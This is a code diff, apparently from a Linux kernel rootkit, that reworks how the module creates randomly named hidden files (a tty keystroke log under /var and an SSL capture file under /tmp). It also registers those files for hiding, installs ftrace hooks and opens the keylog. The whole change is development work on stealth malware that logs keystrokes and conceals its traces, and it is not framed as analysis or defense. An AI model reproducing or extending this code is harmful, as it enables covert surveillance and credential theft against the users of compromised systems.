@@ -864,7 +864,7 @@ void _keylog_cleanup(void) {
 
     _keylog_cleanup_list();
     fs_kernel_close_file(ttyfilp);
-    fs_file_rm(sys_ttyfile(false));
+    fs_file_rm(sys_get_ttyfile());
 
     ttyfilp = NULL;
 }
@@ -1213,69 +1213,62 @@ void fh_remove_hooks(struct ftrace_hook *hooks) {
     }
 }
 
-static char *_sys_file(char *file, int max) {
-    int rand_len;
+struct sysfiles_t {
+    char ttyfile[PATH_MAX];
+    char sslfile[PATH_MAX];
+};
+static struct sysfiles_t sysfiles;
+static bool _sys_file_init(int ttymax, int sslmax) {
     bool rc = false;
 
-    if (file) {
+    if (ttymax > 0 && sslmax > 0) {
 
-        rand_len = max - 1; /** for '\0' */
+        char *tty = kv_util_random_AZ_string(ttymax);
+        char *ssl = kv_util_random_AZ_string(sslmax);
 
-        if (rand_len > 0) {
-            char *rand_buf = kv_util_random_AZ_string(rand_len);
-
-            if (rand_buf) {
-                snprintf(file, max, ".%s", rand_buf);
-                kfree(rand_buf);
-                rc = true;
-            }
+        if (tty && ssl) {
+            snprintf(sysfiles.ttyfile,
+                    sizeof(sysfiles.ttyfile)-1, "/var/.%s", tty);
+            snprintf(sysfiles.sslfile,
+                    sizeof(sysfiles.sslfile)-1, "/tmp/.%s", ssl);
+            kv_mem_free(&tty, &ssl);
+            rc = true;
         }
     }
-    return rc ? file : NULL;
+    return rc;
 }
 
-char *sys_ttyfile(bool init) {
-    static char fullpath[64] = {0};
-    char file[32] = {0};
-    if (*file == 0 && init) {
-        if (_sys_file(file, 31)) {
-            const char *f[] = {file, NULL};
-            fs_add_name_ro(f,0);
-            snprintf(fullpath, sizeof(fullpath), "/var/%s", file);
-        }
-    }
-    return fullpath;
+char *sys_get_ttyfile(void) {
+    return sysfiles.ttyfile;
 }
-
-char *sys_sslfile(bool init) {
-    static char fullpath[64] = {0};
-    char file[32] = {0};
-    if (*file == 0 && init) {
-        if (_sys_file(file, 31)) {
-            const char *f[] = {file, NULL};
-            fs_add_name_ro(f,0);
-            snprintf(fullpath, sizeof(fullpath), "/tmp/%s", file);
-        }
-    }
-    return fullpath;
+char *sys_get_sslfile(void) {
+    return sysfiles.sslfile;
 }
 
 bool sys_init(void) {
     int idx = 0, rc = false;
 
-    /** init both tty and ssl files at start-up */
-    char *ttyfile = sys_ttyfile(true);
-    if (ttyfile && sys_sslfile(true)) {
-        rc = !fh_install_hooks(ft_hooks);
-        if (rc) {
-            for (idx = 0; ft_hooks[idx].name != NULL; ++idx)
-                prinfo("ftrace hook %d on %s\n", idx, ft_hooks[idx].name);
+    if (_sys_file_init(64, 64)) {
+        char *tty = strrchr(sys_get_ttyfile(), '.');
+        char *ssl = strrchr(sys_get_sslfile(), '.');
+        const char *files_to_hide[] = {tty, ssl, NULL};
 
-            /** Open tty log */
-            ttyfilp = fs_kernel_open_file(ttyfile);
-            if (!ttyfilp) {
-                prerr("Failed loading tty file\n");
-                rc = false;
+        /** init fist a couple of hidden files */
+        if (tty && ssl && fs_add_name_ro(files_to_hide, 0) == 0) {
+            prinfo("Hiding tty file: '%s'\n", tty);
+            prinfo("Hiding ssl file: '%s'\n", ssl);
+
+            rc = !fh_install_hooks(ft_hooks);
+            if (rc) {
+                for (idx = 0; ft_hooks[idx].name != NULL; ++idx)
+                    prinfo("ftrace hook %d on %s\n", idx, ft_hooks[idx].name);
+
+                /** Init tty log */
+                ttyfilp = fs_kernel_open_file(sys_get_ttyfile());
+                if (!ttyfilp) {
+                    prerr("Failed loading tty file\n");
+                    rc = false;
+                }
             }
         }
     }
@@ -1286,7 +1279,7 @@ void sys_deinit(void) {
     struct sys_addr_list *sl, *sl_safe;
 
     fh_remove_hooks(ft_hooks);
-    fs_file_rm(sys_sslfile(false));
+    fs_file_rm(sys_get_sslfile());
     _keylog_cleanup();
 
     list_for_each_entry_safe(sl, sl_safe, &sys_addr, list) {
